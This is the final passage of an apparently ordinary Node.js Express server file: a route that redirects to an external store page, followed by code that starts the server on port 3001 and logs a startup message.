  return res.redirect('https://store.mcpvp.club');
});

const PORT = 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on http://localhost:' + PORT);
});